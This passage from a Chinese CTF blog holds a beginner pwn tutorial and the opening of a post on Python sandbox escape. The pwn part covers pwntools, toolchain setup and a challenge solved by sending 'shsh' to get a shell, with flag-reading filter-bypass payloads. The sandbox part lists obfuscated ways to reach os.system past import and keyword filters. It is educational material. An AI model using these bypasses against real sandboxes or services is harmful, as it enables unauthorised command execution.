href="https://www.runoob.com/python/python-tutorial.html">菜鸟教程</a>，计算机实验课上也会给教程让你们自学python，网址我不记得了 另外，exp中会大量使用一个第三方库pwntools，这里给个例子你们应该就能懂了</p></li><li><p>1</p></li><li><p>from pwn import *          #调用pwn库</p></li><li><p>2</p></li><li><p>sh=process(‘./easyrop’)    #打开同文件夹下easyrop文件</p></li><li><p>3</p></li><li><p>sh=remote(‘209.288.0.12’,12033)  #连接209.288.0.12:12033</p></li><li><p>4</p></li><li><p>sh.recvuntil(‘please input:\n’)  #等待屏幕输出&quot;please input\n&quot;</p></li><li><p>5</p></li><li><p>payload=‘a’*20</p></li><li><p>6</p></li><li><p>payload+=p32(0x8048a80) #payload添上0x8048a80在32位格式下转换成的字符串</p></li><li><p>7</p></li><li><p>sh.sendline(payload)    #向程序输入payload加回车</p></li><li><p>8</p></li><li><p>sh.send(‘ya mie die’)   #向程序输入&quot;ya mie die&quot;不加回车</p></li><li><p>9</p></li><li><p>sh.sendlineafter(‘your name:’,‘aaaa’) #等待屏幕输出&quot;your name&quot;后向程序输入&quot;aaaa&quot;加回车</p></li><li><p>10</p></li><li><p>sex_1=‘male’</p></li><li><p>11</p></li><li><p>sex_2=‘female’</p></li><li><p>12</p></li><li><p>sex_3=‘CTFer’</p></li><li><p>13</p></li><li><p>sh.sendafter(‘your gender’,sex_3)     #等待屏幕输出&quot;your gender&quot;后向程序输入sex_3不加回车</p></li><li><p>14</p></li><li><p>sh.recvuntil('ok,so your name is ')</p></li><li><p>15</p></li><li><p>my_name=u64(sh.recv(6).ljust(8,‘\x00’)) #将接下来屏幕输出的六个字符接收下来，调整长度后按64位格式从字符串转回数字</p></li><li><p>16</p></li><li><p>sh.interactive()                        #程序互动权转交给控制台</p></li><li></li><li><p>Copied!</p></li><li><p>payload+=p32(0x8048a80)和my_name=u64(sh.recv(6).ljust(8,‘\x00’))这个两个语句中p和u后面的数字是由程序是32位的还是64位的决定的 所以一个exp里，要么只有p32和u32，要么就只有p64和u64，不会有32和64混合出现，例子里只是为了覆盖知识点才这么写的</p></li></ul><h2 id="题型">题型</h2><p>一般题目会给一个二进制文件的下载链接和一个地址</p><p>二进制文件可以在Linux中直接运行，也可以扔进Windows的反编译器里分析</p><p>连接到那个地址后，服务器会用一个一模一样的程序来响应，这时你屏幕上显示的东西也就会和自己运行那个程序的时候一模一样</p><p>如果你的利用脚本可以通过这个程序拿到本地的shell，那么基本上在连接到目标地址后进行同样的操作就也能拿到对方机子的shell，这个时候输入Linxu命令就会被目标主机执行</p><h2 id="环境">环境</h2><p><strong>Linux</strong></p><p>Linux有许多花里胡哨的版本，这里咱们就用ubuntu 16.04就行 切记16.04!!! 首先下载安装<a href="https://www.jianshu.com/p/a979f489b47b">VMware</a> 然后上<a href="https://releases.ubuntu.com/16.04/">镜像网站</a>下载ubuntu 16.04镜像 速度太慢的话还有<a href="https://www.jianshu.com/p/8d5ad27b96b9">其他源</a>可以下 这里我就翻中科大的牌儿了 <img src="https://z3.ax1x.com/2021/09/21/4tAyQJ.png" alt="img"> 下载好后打开VMware，创建新的虚拟机 <img src="https://z3.ax1x.com/2021/09/21/4tADWF.png" alt="img"> 选择自定义</p><p><img src="https://z3.ax1x.com/2021/09/21/4tArz4.png" alt="img"></p><p>直接下一步</p><p><img src="https://z3.ax1x.com/2021/09/21/4tA6y9.png" alt="img"></p><p>选择骚后安装操作系统，下一步</p><p><img src="https://z3.ax1x.com/2021/09/21/4tA2e1.png" alt="img"></p><p>选择Linux,下面找到ubuntu64，下一步</p><p><img src="https://z3.ax1x.com/2021/09/21/4tAcLR.png" alt="img"></p><p>然后给虚拟机取个名字，这里用句大实话代替，下面位置必须是已经存在的文件夹(建议别放C盘)，下一步</p><p><img src="https://z3.ax1x.com/2021/09/21/4tARdx.png" alt="img"></p><p>直接下一步</p><p><img src="https://z3.ax1x.com/2021/09/21/4tAWo6.png" alt="img"></p><p>内存看自己配置，16G电脑就给8G，8G电脑就给4G，下一步</p><p><img src="https://z3.ax1x.com/2021/09/21/4tAhFK.png" alt="img"></p><p>直接下一步</p><p><img src="https://z3.ax1x.com/2021/09/21/4tA4JO.png" alt="img"></p><p>下一步</p><p><img src="https://z3.ax1x.com/2021/09/21/4tA5WD.png" alt="img"></p><p>下一步</p><p><img src="https://z3.ax1x.com/2021/09/21/4tAoSe.png" alt="img"></p><p>下一步</p><p><img src="https://z3.ax1x.com/2021/09/21/4tATQH.png" alt="img"></p><p>选择储存为单个文件，下一步</p><p><img src="https://z3.ax1x.com/2021/09/21/4tAOTP.png" alt="img"></p><p>下一步</p><p><img src="https://z3.ax1x.com/2021/09/21/4tAqeI.png" alt="img"></p><p>选择自定义硬件 使用ISO镜像文件，把下载的ubuntu镜像位置填进去</p><p><img src="https://z3.ax1x.com/2021/09/21/4tALwt.png" alt="img"></p><p>关闭，完成 这样就有了一个虚拟机</p><p><img src="https://z3.ax1x.com/2021/09/21/4tAHOA.png" alt="img"></p><p>点击开启此虚拟机，等出现下面这个画面，选择中文，安装ubuntu</p><p><img src="https://z3.ax1x.com/2021/09/21/4tA7yd.png" alt="img"></p><p>直接继续</p><p><img src="https://z3.ax1x.com/2021/09/21/4tAjFf.png" alt="img"></p><p>选择现在安装</p><p><img src="https://z3.ax1x.com/2021/09/21/4tAvY8.png" alt="img"></p><p>选择继续</p><p><img src="https://z3.ax1x.com/2021/09/21/4tAxfS.png" alt="img"></p><p>继续</p><p><img src="https://z3.ax1x.com/2021/09/21/4tEplQ.png" alt="img"></p><p>汉语，继续</p><p><img src="https://z3.ax1x.com/2021/09/21/4tESSg.png" alt="img"></p><p>账户密码，继续</p><p><img src="https://z3.ax1x.com/2021/09/21/4tE9yj.png" alt="img"></p><p>等它搞完，选择重启 这样一个活生生的Linux就装好了 不要升级！ 不要升级！ 不要升级！ 然后咱们把源换一下，不然下载东西很慢 先进入设置-系统设置，找到软件和更新</p><p><img src="https://z3.ax1x.com/2021/09/21/4tECOs.png" alt="img"></p><p>打开，找到下载自选项</p><p><img src="https://z3.ax1x.com/2021/09/21/4tEimn.png" alt="img"></p><p>选择中国，或者在中国选项下面选一个看着顺眼的源 <img src="https://z3.ax1x.com/2021/09/21/4tEEkV.png" alt="img"></p><p>然后授权-关闭-重新载入 接着要装一些库让你64位的Linux可以运行32位的程序 Ctrl + Alt + T打开控制台</p><p>1</p><p>sudo apt-get install gcc-multilib</p><p>Copied!</p><p>安装完成后接着输入</p><p>1</p><p>sudo apt-get install libc6:i386</p><p>Copied!</p><p><strong>Windows</strong></p><p>Windows说实话其实没有太多需要配置的，nc签到题要是嫌麻烦不想开Linux写可以在Windows上装一个netcat，这样可以直接用控制台来nc 也基本仅限于做nc签到题了，所以意义不太大 <a href="https://www.cnblogs.com/kukudetent/p/11696500.html">安装教程</a> 使用方法，以<a href="https://ctf.show/challenges">CTF秀</a>为例 PWN第一题PWN签到题，直接先launch了这个instance <img src="https://z3.ax1x.com/2021/09/21/4tEFwq.png" alt="img"></p><p>看到一行nc 111.231.70.44 28071 这个就是我们要连接的目标地址 安装好netcat后直接复制进控制台</p><p>(不要直接复制↑上面那个指令，要自己去ctfshow靶场上申请一个题目环境)</p><p><img src="https://z3.ax1x.com/2021/09/21/4tEkT0.png" alt="img"></p><p>flag就出来了 <img src="https://z3.ax1x.com/2021/09/21/4tEVYT.png" alt="img"></p><h2 id="工具">工具</h2><h3 id="Wndows部分">Wndows部分</h3><p>IDA 群文件里可以直接下载 <img src="https://s3.bmp.ovh/imgs/2021/09/af157825031bcb93.png" alt="img"></p><p>emmm还有三天到期？那你们猜猜这个文档是什么时候写的 IDA是一个功能很强大的反编译软件，使用方法如下 假设我们已经下好了一个二进制文件 <img src="https://s3.bmp.ovh/imgs/2021/09/928077802e3391f6.png" alt="img"></p><p>双击直接打开，这时会询问打开方式，用我们熟悉的影音先锋打开它，直接拖到最后选择在这台电脑上查找其他应用</p><p><img src="https://s3.bmp.ovh/imgs/2021/09/f29e7bb5ee5eda91.png" alt="img"></p><p>找到你IDA的安装目录，会看到有两个可执行文件，带64的是反编译64位文件的，不带64是反编译32位文件的 至于怎么看这个文件是32位的还是64位的，可以拖进Linux里用file命令查看 但是两个exe都试一下看看哪个没报错其实也挺方便 而且题目做多了以后你们就可以自己总结出在IDA打开文件时有哪些小细节能帮助你判断这是32位的还是64位的</p><p><img src="https://s3.bmp.ovh/imgs/2021/09/3371f0dc29fd79c4.png" alt="img"></p><p>打开文件时一路确定就行，然后一般都直接进main函数去分析它的主要功能</p><p><img src="https://s3.bmp.ovh/imgs/2021/09/a49b1e09dcc5f952.png" alt="img"></p><p>双击进入，可以看到main函数的整体流程和汇编代码，按空格可以切换到线性代码，按下F5能反汇编出伪代码 <img src="https://s3.bmp.ovh/imgs/2021/09/47cef4a12b9300b7.png" alt="img"></p><p>多数变量和函数名都是IDA默认命名，可以右键重命名便于自己理解程序 函数可以双击跟进去分析其功能，然后按ESC返回跟进前的函数</p><p><img src="https://s3.bmp.ovh/imgs/2021/09/26c3471d9df41e4f.png" alt="img"></p><p>双击变量可以查看他们在栈上的排列，就不贴图了</p><h3 id="Linux部分">Linux部分</h3><p><em><strong>以下工具的安装过程会涉及到安装或更新其他库(包括首先要按 “环境” 那一部分正确配置好你的宝贝Linux)，比如所有工具都需要提前安装并更新好pip，但是安装更新操作只需要执行一次，所以我只在安装pwntools的时候给出了该操作。如果跳过前几个工具的安装，先按我给的操作安装ROPgadget，那么基本上安装不了(但是可以自己根据报错来解决)。所以务必要按照本文给的顺序依次安装，指令不能少也不能错</strong></em></p><p><strong>Python</strong></p><p>Python是干啥的应该不用我介绍吧 ubuntu默认安装了python 2.7,Ctrl + Alt + T调出控制台，输入python，测试一下python是不是能正常使用 <img src="https://s3.bmp.ovh/imgs/2021/09/dfe779c25978568e.png" alt="img"></p><p><strong>pwntools</strong></p><p>安装： 在控制台输入</p><p>1</p><p>sudo apt install python-pip</p><p>Copied!</p><p>这一步是安装pip的</p><p>安装好后再输入</p><p>1</p><p>sudo pip install --upgrade pip</p><p>Copied!</p><p>更新pip 正式安装pwntools</p><p>1</p><p>pip install pwntools</p><p>Copied!</p><p>测试：</p><p>控制台输入</p><p>1</p><p>python</p><p>2</p><p>import pwn</p><p>Copied!</p><p>如果这个时候没报错那么基本上是安装成功了</p><p>如果不放心可以接着测试</p><p>输入</p><p>1</p><p>sudo apt install git</p><p>Copied!</p><p>下载peda插件，编入.gdbinit</p><p>1</p><p>git clone <a href="https://github.com/longld/peda.git">https://github.com/longld/peda.git</a> ~/peda</p><p>2</p><p>echo “source ~/peda/peda.py” &gt;&gt; ~/.gdbinit</p><p>Copied!</p><p>测试： 控制台输入</p><p>1</p><p>gdb</p><p>Copied!</p><p>如果显示了gdb-peda$说明安装成功</p><p><img src="https://s3.bmp.ovh/imgs/2021/09/857afcf23d4b345c.png" alt="img"></p><p><strong>checksec</strong></p><p>用于检查二进制文件保护开启情况的工具</p><p>安装</p><p>1</p><p>git clone <a href="https://github.com/slimm609/checksec.sh.git">https://github.com/slimm609/checksec.sh.git</a></p><p>2</p><p>cd <a href="http://checksec.sh">checksec.sh</a></p><p>3</p><p>sudo ln -s checksec /usr/local/bin/checksec</p><p>Copied!</p><p>测试：</p><p>1</p><p>checksec</p><p>Copied!</p><p><img src="https://s3.bmp.ovh/imgs/2021/09/a835d816c8aebb46.png" alt="img"></p><p>43</p><p><strong>ROPgadget</strong></p><p>用于在二进制文件中寻找用于构建攻击代码的现成代码块(俗称gadgets)的工具</p><p>先更新一下apt</p><p>1</p><p>sudo apt-get update</p><p>2</p><p>sudo apt-get upgrade</p><p>Copied!</p><p>正式安装</p><p>1</p><p>sudo apt-get install python-capstone</p><p>2</p><p>git clone <a href="https://github.com/JonathanSalwan/ROPgadget.git">https://github.com/JonathanSalwan/ROPgadget.git</a></p><p>3</p><p>cd ROPgadget</p><p>4</p><p>sudo python <a href="http://setup.py">setup.py</a> install</p><p>Copied!</p><p><img src="https://pic.imgdb.cn/item/6149d6e32ab3f51d913f8eb8.png" alt="img"></p><p>报错是因为我没加参数，如果报的错不一样，那么八成是安装失败了 checksec也是</p><p><strong>ropper</strong></p><p>与ROPgadget功能一致，但有时候更强大</p><p>1</p><p>pip install setuptools --upgrade</p><p>2</p><p>pip install filebytes</p><p>3</p><p>pip install keystone-engine</p><p>4</p><p>pip install ropper</p><p>Copied!</p><p><img src="https://pic.imgdb.cn/item/6149d71f2ab3f51d913ff660.png" alt="img"></p><p>45</p><p>话说我为了写这个入门手册，自己又配好了一个环境，要不要干脆就打包发出来呢 还是算了，我去年装虚拟机经历的痛苦，你们一丝都不能少 这可都是为你们好，多熟悉熟悉linux操作的姿势，可养发了</p><h2 id="一道例题">一道例题</h2><p>没有什么高深的技术(高深的我也不会呀)，主要是体验pwn解题的过程</p><p>咱们靶场还没建好，题目就都在这里手动给了</p><p><a href="https://pan.baidu.com/s/1ELu0ELg-FhAj7yZ349POIw">二进制文件</a> 提取码：afnw</p><p>直接拖入IDA64打开</p><p>找到main，F5反编译 看到通过scanf可以往cmmand这个变量里输入8个字符</p><p><img src="https://pic.imgdb.cn/item/6149d7932ab3f51d9140cb43.png" alt="img"></p><p>在程序的最后会调用system执行cmmand</p><p>上面讲过，如果能执行system(“/bin/sh”)就能拿到shell</p><p>所以我们要想办法让command储存的就是&quot;/bin/sh&quot;这个字符串</p><p>但是程序还会对command进行一些处理，它会遍历command</p><p>然后和36,48,115,104这些进行比较</p><p>这些数字在ASCII码表里各对应着一个字符</p><p>实际上就是在和这些字符比较</p><p>点击36，按R可以将整数转换为字符 <img src="https://pic.imgdb.cn/item/6149d7b02ab3f51d9141006a.png" alt="img"></p><p>意思是说</p><p>如果发现cmmand里面有’$‘并且下一个是’0’</p><p>或者发现’s’并且下一个是’h’</p><p>(其实就是说如果有’$0’或者’sh’)</p><p>那么就会进入if里面的操作</p><p>在if里会把’sh’或者’$0’删掉</p><p>比如</p><p>如果我们输入&quot;/bin/sh&quot;</p><p>最后会执行system(“/bin/”)</p><p>如果输入&quot;sh&quot;</p><p>最后会执行system(“”)(字符串是空的)</p><p>如果输入&quot;sh123&quot;</p><p>最后会执行system(“12123”)</p><p>这些都是无效指令，肯定都是拿不到shell的</p><p>那么该怎么让处理过的command的里面还有’sh’呢？</p><p>想一想，如果输入的是&quot;shsh&quot;或者&quot;sshh&quot;</p><p>&quot;shsh&quot;的话，首先程序会发现第一个’sh’</p><p>于是会把后两个字符覆盖过来</p><p>但是后两个依然是’sh’，所以前两个字符并不会变</p><p>然后程序会继续向下遍历，找到第二个’sh’</p><p>此时再往后两个字符都是空字符</p><p>第二个’sh’就会被覆盖为空</p><p>commad就变成了’sh’</p><p>&quot;sshh&quot;的话，程序只会发现中间有个’sh’</p><p>于是把后面的’h’和一个空字符覆盖过来</p><p>而这个空字符是作为字符串结束的标志，所以程序会认为commad这个字符串到第一个’h’后就结束了</p><p>commad也会变成’sh’</p><p>这样，最后就执行了system(‘sh’)，也就拿到shell了 可以看到在haoshufu这个程序里出现了控制台标志$，并且可以对输入的指令进行响  应那咱们连上远端，实战一下</p><p><img src="https://pic.imgdb.cn/item/6149d7bf2ab3f51d91411e21.png" alt="img"></p><p><img src="https://pic.imgdb.cn/item/6149d7ce2ab3f51d91413a39.png" alt="img"></p><p>(远端失效了，在本地做做练练手就行)</p><p>1</p><p>Win + R</p><p>2</p><p>cmd</p><p>Copied!</p><p>开启控制台</p><p>1</p><p>nc 106.15.120.40 8009</p><p>Copied!</p><p><img src="https://pic.imgdb.cn/item/6149d7e02ab3f51d9141597b.png" alt="img"></p><p>50</p><p>1</p><p>shsh</p><p>Copied!</p><p><img src="https://pic.imgdb.cn/item/6149d7ee2ab3f51d914170fb.png" alt="img"></p><p>51</p><p>1</p><p>ls   查看目录</p><p>Copied!</p><p><img src="https://pic.imgdb.cn/item/6149d7fc2ab3f51d914187ed.png" alt="img"></p><p>52</p><p>1</p><p>cat flag   打印flag文件内容</p><p>Copied!</p><p><img src="https://pic.imgdb.cn/item/6149d8082ab3f51d91419ba4.png" alt="img"></p><p>flag就是flag{biubiubiubiubiubiubiubiu}</p><p>*<strong>* 其他解法</strong></p><p>有大师傅给了不一样的思路</p><p>对于比赛中的pwn题来说，其实我们最终需要的只是flag文件里的字符串，拿到shell可以很方便的读出这个字符串，然而就算不拿shell我们还是有办法将文件泄露出来，比如orw，可以自行百度</p><p>对于这题，给了我们控制system函数参数的权利，其实也就相当于给了shell</p><p>我们可以直接执行system(“cat flag”)来读取flag</p><p>但是scanf读取到空格就会结束，所以还需要绕过一下</p><p>payload：</p><p>1</p><p>cat&lt;flag</p><p>2</p><p>cat$IFS*</p><p>3</p><p>od&lt;flag</p><p>4</p><p>nl&lt;flag</p><p>5</p><p>pg&lt;flag</p><p>6</p><p>dd&lt;flag</p><p>7</p><p>sh&lt;flag</p><p>8</p><p>……</p><p>Copied!</p><p>原理就不解释了，可以自己查有关这些指令和符号的介绍</p><p>最上面两个不易成功，可以自己研究研究是为什么</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python 沙箱逃逸</title>
    <link href="/2022/03/14/Python%20%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <url>/2022/03/14/Python%20%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>沙箱逃逸本质上最终目的是执行任意系统命令，次一点的是写文件，再次一点的是读文件。</p><p>一般在在线<code>oj (online judge )</code>中或者在<code>CTF</code>比赛中为了防止恶意用户任意执行<code>Python</code>代码而做出的一些限制，一般将<code>Python</code>运行在沙箱中。沙箱会对一些敏感的函数进行禁用，例如<code>os</code>。我们所需要做的便是研究如何逃逸沙箱与相应的防护措施。</p><h2 id="系统命令">系统命令</h2><p>一般来说在<code>Python</code>中可以执行系统命令的方式有许多种：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">os<br>commands：仅限<span class="hljs-number">2</span><span class="hljs-selector-class">.x</span><br>subprocess<br>timeit：timeit.sys、timeit<span class="hljs-selector-class">.timeit</span>(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>, number=<span class="hljs-number">1</span>)<br>platform：platform.os、platform.sys、platform<span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>, mode=<span class="hljs-string">&#x27;r&#x27;</span>, bufsize=-<span class="hljs-number">1</span>)<span class="hljs-selector-class">.read</span>()<br>pty：pty<span class="hljs-selector-class">.spawn</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)、pty<span class="hljs-selector-class">.os</span><br>bdb：bdb.os、cgi<span class="hljs-selector-class">.sys</span><br>cgi：cgi.os、cgi<span class="hljs-selector-class">.sys</span><br>...<br></code></pre></td></tr></table></figure><p>一般来说通过这些函数库我们便可以执行任意高危指令，对于<code>oj</code>平台来说如果不采取措施应对，那就只有被打的份了。</p><h3 id="导入-import-的各种方式">导入 import 的各种方式</h3><p>我们如果直接禁用<code>import os</code>会怎么样？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span>  os<br><span class="hljs-keyword">import</span>   os<br></code></pre></td></tr></table></figure><p>可以看到如果我们多加入几个空格就可以绕过这个防护，同时Python 能够 import 的可不止 <code>import</code>，还有 <code>__import__</code>：<code>__import__('os')</code>，<code>__import__</code>被干了还有 <code>importlib</code>：<code>importlib.import_module('os').system('ls')</code></p><p>这样就安全了吗？实际上<code>import</code>可以通过其他方式完成。回想一下 <code>import</code> 的原理，本质上就是执行一遍导入的库。这个过程实际上可以用 <code>execfile</code> 来代替：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">execfile(<span class="hljs-string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)<br>system(<span class="hljs-string">&#x27;ls&#x27;</span>)<br></code></pre></td></tr></table></figure><p>不过要注意，<code>2.x</code> 才能用，<code>3.x</code> 删了 <code>execfile</code>，不过可以这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/usr/lib/python3.6/os.py&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">exec</span>(f.read())<br>system(<span class="hljs-string">&#x27;ls&#x27;</span>)<br></code></pre></td></tr></table></figure><p>这个方法倒是 <code>2.x</code>、<code>3.x</code> 通用的。</p><p>不过要使用上面的这两种方法，就必须知道库的路径。其实在大多数的环境下，库都是默认路径。如果 <code>sys</code> 没被干掉的话，还可以确认一下，：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-built_in">print</span>(sys.path)<br></code></pre></td></tr></table></figure><h3 id="花式处理字符串">花式处理字符串</h3><p>如果在代码中禁用了<code>os</code>，我们还可以通过字符串各种方式的变换来实现引入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;so&#x27;</span>[::-<span class="hljs-number">1</span>]).system(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>----------------------------------------<br>b = <span class="hljs-string">&#x27;o&#x27;</span><br>a = <span class="hljs-string">&#x27;s&#x27;</span><br><span class="hljs-built_in">__import__</span>(a+b).system(<span class="hljs-string">&#x27;ls&#x27;</span>)<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;</span>[::-<span class="hljs-number">1</span>])<br>----------------------------------------<br><span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p><code>eval</code>、<code>exec</code> 都是相当危险的函数，<code>exec</code> 比 <code>eval</code> 还要危险，它们一定要过滤，因为字符串有很多变形的方式，对字符串的处理可以有：逆序、变量拼接、<code>Base64</code>、<code>hex</code>、<code>rot13</code>等等方式构造出来…</p><h3 id="恢复-sys-modules">恢复 sys.modules</h3><p><code>sys.modules</code> 是一个字典，里面储存了加载过的模块信息。如果 <code>Python</code> 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库例如 <code>os</code> 是默认被加载进来的，但是不能直接使用，原因在于 <code>sys.modules</code> 中未经 <code>import</code> 加载的模块对当前空间是不可见的。</p><p>如果将 <code>os</code> 从 <code>sys.modules</code> 中剔除，<code>os</code> 就彻底没法用了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&#x27;not allowed&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> os<br><span class="hljs-meta">&gt;&gt;&gt; </span>os.system(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>AttributeError: <span class="hljs-string">&#x27;str&#x27;</span> <span class="hljs-built_in">object</span> has no attribute <span class="hljs-string">&#x27;system&#x27;</span><br></code></pre></td></tr></table></figure><p>注意，这里不能用 <code>del sys.modules['os']</code>，因为，当 import 一个模块时：<code>import A</code>，检查 <code>sys.modules</code> 中是否已经有 A，如果有则不加载，如果没有则为 <code>A</code> 创建 <code>module</code> 对象，并加载 <code>A</code>。</p><p>所以删了 <code>sys.modules['os']</code> 只会让 <code>Python</code> 重新加载一次 <code>os</code>。</p><p>看到这你肯定发现了，对于上面的过滤方式，绕过的方式可以是这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&#x27;not allowed&#x27;</span> <span class="hljs-comment"># oj 为你加的</span><br><br><span class="hljs-keyword">del</span> sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>]<br><span class="hljs-keyword">import</span> os<br>os.system(<span class="hljs-string">&#x27;ls&#x27;</span>)<br></code></pre></td></tr></table></figure><p>最后还有一种利用 <code>__builtins__</code> 导入的方式，下面会详细说。</p><h3 id="花式执行函数">花式执行函数</h3><p>通过上面内容我们很容易发现，光引入 <code>os</code> 只不过是第一步，如果把 <code>system</code> 这个函数干掉，也没法通过<code>os.system</code>执行系统命令，并且这里的<code>system</code>也不是字符串，也没法直接做编码等等操作。我遇到过一个环境，直接在<code>/usr/lib/python2.7/os.py</code>中删了<code>system</code>函数。。。</p><p>不过，要明确的是，<code>os</code> 中能够执行系统命令的函数有很多：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>))<br><span class="hljs-built_in">print</span>(os.popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()) <br><span class="hljs-built_in">print</span>(os.popen2(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()) <span class="hljs-comment"># 2.x</span><br><span class="hljs-built_in">print</span>(os.popen3(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()) <span class="hljs-comment"># 2.x</span><br><span class="hljs-built_in">print</span>(os.popen4(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()) <span class="hljs-comment"># 2.x</span><br>...<br></code></pre></td></tr></table></figure><p>应该还有一些，可以在这里找找：</p><p><a href="https://docs.python.org/2/library/os.html">2.x 传送门</a></p><p><a href="https://docs.python.org/3/library/os.html">3.x 传送门</a></p><p>过滤<code>system</code>的时候说不定还有其他函数给漏了。</p><p>其次，可以通过 <code>getattr</code> 拿到对象的方法、属性：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-built_in">getattr</span>(os, <span class="hljs-string">&#x27;metsys&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>不让出现 import也没事：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(__builtins__, <span class="hljs-string">&#x27;__tropmi__&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;so&#x27;</span>[::-<span class="hljs-number">1</span>]), <span class="hljs-string">&#x27;metsys&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>一样可以。这个方法同样可以用于逃逸过滤 import 的沙箱。关于 <code>__builtins__</code>，见下文。</p><p>与 <code>getattr</code> 相似的还有 <code>__getattr__</code>、<code>__getattribute__</code>，它们自己的区别就是<code>getattr</code>相当于<code>class.attr</code>，都是获取类属性/方法的一种方式，在获取的时候会触发<code>__getattribute__</code>，如果<code>__getattribute__</code>找不到，则触发<code>__getattr__</code>，还找不到则报错。更具体的这里就不解释了，有兴趣的话可以搜搜。</p><h3 id="builtins-、builtin-与-builtins">builtins 、<strong>builtin</strong> 与 <strong>builtins</strong></h3><p>先说一下，<code>builtin</code>、<code>builtins</code>，<code>__builtin__</code>与<code>__builtins__</code>的区别：首先我们知道，在 <code>Python</code> 中，有很多函数不需要任何 <code>import</code> 就可以直接使用，例如<code>chr</code>、<code>open</code>。之所以可以这样，是因为 <code>Python</code> 有个叫<code>内建模块</code>（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。顺便说一下，<code>Python</code> 对函数、变量、类等等的查找方式是按 <code>LEGB</code> 规则来找的，其中 B 即代表内建模块，这里也不再赘述了，有兴趣的搜搜就明白了。</p><p>在 <code>2.x</code> 版本中，内建模块被命名为 <code>__builtin__</code>，到了 3.x 就成了 <code>builtins</code>。它们都需要 <code>import</code> 